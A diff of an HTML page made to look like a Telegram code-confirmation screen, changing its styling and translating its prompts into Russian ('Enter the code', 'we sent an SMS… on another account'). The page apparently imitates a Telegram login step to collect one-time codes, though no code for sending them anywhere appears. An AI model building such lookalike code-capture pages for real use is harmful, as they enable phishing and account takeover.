@@ -7,7 +7,7 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
         body {
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Telegram', sans-serif;
             background-color: #f6f6f6;
             margin: 0;
             padding: 0;
@@ -17,7 +17,7 @@
             height: 100vh;
         }
         .container {
-            background-color: #eff0f1;
+            background-color: #fff;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
@@ -35,25 +35,18 @@
             font-size: 18px;
             margin-bottom: 20px;
         }
-        .code-input {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        .code-input input[type="text"] {
+        input[type="text"] {
             width: 50px;
-            height: 50px;
+            height: 70px;
             text-align: center;
-            padding: 5px;
-            margin-right: 10px;
+            padding: 10px;
+            margin-bottom: 5px;
             border: 1px solid #ccc;
             border-radius: 5px;
-            font-family: 'Roboto', sans-serif;
-            font-size: 24px;
+            font-family: 'Telegram', sans-serif;
         }
         .emoji {
-            font-size: 64px;
+            font-size: 48px;
             margin-bottom: 20px;
         }
         button {
@@ -70,20 +63,20 @@
 </head>
 <body>
     <div class="container">
-        <span class="emoji">📩</span>
-        <h1>Telegram Code Confirmation</h1>
-        <p>Please confirm the code sent to your Telegram.</p>
+        <span class="emoji" style="font-size: 100px;">📩</span>
+        <h1>Введите код</h1>
+        <p>Мы отправили SMS с кодом проверки в сообщения на другом аккаунте</p>
         <form>
-            <div class="code-input">
-                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
-                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
-                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
-                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
-                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
+            <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 20px;">
+                <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
+                <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
+                <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
+                <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
+                <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
             </div>
-            <button>Confirm</button>
+            <button>Дальше</button>
         </form>
     </div>
 </body>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 </html>
